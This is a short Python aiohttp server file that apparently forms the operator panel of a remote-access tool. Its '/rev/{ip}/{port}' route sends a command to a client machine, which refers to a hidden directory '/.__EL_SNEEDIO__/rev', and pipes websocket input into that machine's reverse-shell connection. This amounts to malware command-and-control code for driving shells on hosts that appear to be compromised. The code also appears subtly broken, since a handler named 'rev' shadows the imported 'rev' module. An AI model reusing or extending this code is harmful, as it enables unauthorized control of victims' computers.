#!/usr/bin/env python3

from aiohttp import web
from main import comm, rev

routes = web.RouteTableDef()

@routes.get("/")
async def index(request):
    return web.Response(text="sneed")

ws_clients = {}

@routes.get("/rev/{ip}/{port}")
async def rev(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    ip = request.match_info["ip"]
    port = request.match_info["port"]
    token = comm.clients[(ip, int(port))].msg("ls /.__EL_SNEEDIO__/rev") # command needs to be in background?
    ws_clients[token] = ws

    async for msg in ws:
        rev.clients[token][1].write(bytes(msg, "utf8"))
        await rev.clients[token][1].drain()

    return ws
